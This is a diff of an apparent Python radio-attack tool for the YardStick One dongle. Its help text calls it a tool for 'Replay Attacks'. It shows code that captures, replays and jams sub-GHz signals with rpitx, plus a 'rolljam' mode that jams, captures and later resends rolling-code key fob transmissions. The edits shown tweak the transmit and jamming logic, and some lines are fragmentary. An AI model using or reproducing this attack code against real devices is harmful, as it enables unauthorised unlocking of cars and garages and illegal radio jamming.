@@ -1,15 +1,13 @@
-# currently in dev.
-
 from rflib import *
 import argparse, bitstring, time
 import subprocess
 
 def main():
-    parser = argparse.ArgumentParser(description="YardRF is for relaying/capturing/jamming/rolljam fun")
+    parser = argparse.ArgumentParser(description="Replay Attacks for YardStick One")
     parser.add_argument('-f', '--frequency', help='Specify frequency to listen on [default: 433.92MHz (433920000)]', default=433920000, type=int)
     parser.add_argument('-m', '--modulation', help='Specify modulation type [default: ASK_OOK] example: 2fsk', default='MOD_ASK_OOK')
     parser.add_argument('-b', '--baudrate', help='Specify sample rate, baudrate [default: 4800] example: 4000', default=4800, type=int)
-    parser.add_argument('-d', '--deviation', help='Specify deviation [default: 0] examples: 23803.71, 47607.42, 29.30', default=0, type=float)
+    parser.add_argument('-d', '--deviation', help='Specify deviation [default: 0] examples: 2.380371, 47.60742, 29.30', default=0, type=float)
     parser.add_argument('-s', '--channel_spacing', help='Specify Channel Spacing [Default: 24000]', type=int, default=24000)
     parser.add_argument('-cb', '--channel_bandwidth', help='Specify channel bandwidth [default: 750000]', default=750000, type=int)
     parser.add_argument('-bs', '--blocksize', help='Specify capture blocksize [default: 400]', default=400, type=int)
@@ -62,7 +60,8 @@ def main():
     d.setMdmDRate(baudrate)
     d.setMdmChanSpc(channel_spacing)
     d.setMdmChanBW(channel_bandwidth)
-    if deviation != 0:
+    d.setChannel(0)
+    if (deviation != 0):
         d.setMdmDeviatn(deviation)
     d.setMaxPower() # max power
     if low:
@@ -73,11 +72,11 @@ def main():
         signals = []
         file = open(cap, 'r')
         for signal in file:
-            signals.append(file.strip())
+            signals.append(signal)
 
     else:
         # start jamming with rpitx if specified
-        if rpitxJ != '':
+        if rpitxJ != None:
             print("[*] Starting Jammer with rpitx\n -  Frequency: " + str(frequency - 300000))
             proc = rpitxJammer(frequency, rpitxJ)
             signals = captureSignal(d, minRSSI, maxRSSI, limit, bs)
@@ -129,13 +128,14 @@ def main():
         if not auto:
             input("[ENTER TO SEND PAYLOAD]")
         print("[*] Rolljam enabled, so only sending first capture..\n")
-        d.makePktFLEN(len(payloads[0]))
-        d.RFxmit(payloads[0])
+#        d.makePktFLEN(len(payloads[0]))
+        d.RFxmit(payloads[0] + emptyKey)
         print("[PACKET SENT] Payload transmittion completed..\n")
 
         input("[ENTER TO SEND OTHER PAYLOAD]")
         for x in range(1, len(payloads)):
             d.makePktFLEN(len(payloads[x]))
+            #time.sleep(.5)
             d.RFxmit(payloads[x])
             print("[PACKET SENT] Payload transmittion completed..\n")
     else:
@@ -145,6 +145,7 @@ def main():
         for x in range(1, number):
             for payload in payloads:
                 d.makePktFLEN(len(payload))
+                time.sleep(.5)
                 d.RFxmit(payload)
                 print("[PACKET SENT] Payload transmittion completed..\n")
 
